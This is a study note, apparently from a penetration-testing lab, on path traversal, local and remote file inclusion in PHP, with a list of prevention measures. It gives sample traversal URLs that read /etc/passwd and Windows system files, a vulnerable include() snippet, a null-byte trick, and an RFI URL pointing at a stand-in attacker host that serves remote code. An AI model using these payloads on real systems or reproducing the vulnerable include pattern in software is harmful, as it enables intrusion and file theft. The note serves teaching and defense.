---
{"dg-publish":true,"permalink":"/src/site/notes/src/site/notes/src/site/notes/src/site/notes/main/cs/pentesting/file-inclusion/file-inclusion/"}
---






## ==Path Traversal==

- AKA, Directory Traversal a web security vulnerability allows an attacker to read operating system resources, such as local files on the server running an application.
- Path traversal vulnerabilities occur when the user's input is passed to a function such **==as file_get_contents in PHP.==**
- Path traversal attacks, also known as the dot-dot-slash attack, take advantage of moving the ==**directory one step up using the double dots ../.**==
- If the attacker finds the entry point, which in this case get.php?file=, then the attacker may send something as follows, [http://webapp.thm/get.php?file=../../../../etc/passwd](http://webapp.thm/get.php?file=../../../../etc/passwd)
- Each .. entry moves one directory until it reaches the root directory /. Then it changes the directory to **==/etc, and from there, it read the passwd file.==**

![Untitled 2.png|Untitled 2.png](/img/user/img/Untitled%202.png)

  

- For Windows directories :

[http://webapp.thm/get.php?file=../../../../boot.ini](http://webapp.thm/get.php?file=../../../../boot.ini) or

[http://webapp.thm/get.php?file=../../../../windows/win.ini](http://webapp.thm/get.php?file=../../../../windows/win.ini)

  

![Screenshot_2023-10-03_at_11.01.29_PM.png](/img/user/img/Screenshot_2023-10-03_at_11.01.29_PM.png)

## ==Local File Inclusion (LFI)==

- With PHP, using functions such as include, require, include_once, and require_once often contribute to vulnerable web applications.

```PHP
<?PHP 
	include("languages/". $_GET['lang']); 
?>
```

- In the above code, the developer decided to use the include function to call PHP pages in the languages directory only via lang parameters.
    - If there is no input validation, the attacker can manipulate the URL by replacing the lang input with other ==**OS-sensitive files such as /etc/passwd.**==
    - The following will be the exploit :
    - http://webapp.thm/index.php?lang=../../../../etc/passwd

### ==Null Bytes==

- We can use the NULL BYTE, which is %00.
- By adding the Null Byte at the end of the payload, we tell the include function to ignore anything after the null byte which may look like :
    - include("languages/../../../../../etc/passwd%00").".php"); which equivalent to → include("languages/../../../../../etc/passwd");
- Deprecated after PHP 5.3.4.

![Untitled 1.png](/img/user/img/Untitled%201.png)

## ==Remote File Inclusion (RFI)==

- A technique to include remote files and into a vulnerable application. Like LFI, the RFI occurs when improperly ==**sanitizing user input, allowing an attacker to inject an external URL into include function.**==
    - One requirement for RFI is that the allow_url_fopen option needs to be on.

1. First, the attacker injects the malicious URL, which points to the attacker's server, such as http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt.
2. If there is no input validation, then the malicious URL passes into the include function. Next, the web app server will send a GET request to the malicious server to fetch the file.
3. As a result, the web app includes the remote file into include function to execute the PHP file within the page and send the execution content to the attacker.

## ==Prevention==

1. Keep system and services, including web application frameworks, ==**updated with the latest version.**==
2. **==Turn off PHP errors to avoid leaking the path==** of the application and other potentially revealing information.
3. A **==Web Application Firewall (WAF)==** is a good option to help mitigate web application attacks.
4. Disable some PHP features that cause file inclusion vulnerabilities if your web app doesn't need them**==, such as allow_url_fopen on and allow_url_include.==**
5. Carefully analyze the web application and **==allow only protocols and PHP wrappers that are in need.==**
6. **==Never trust user input,==** and make sure to implement proper input validation against file inclusion.
7. Implement whitelisting for file names and locations as well as blacklisting.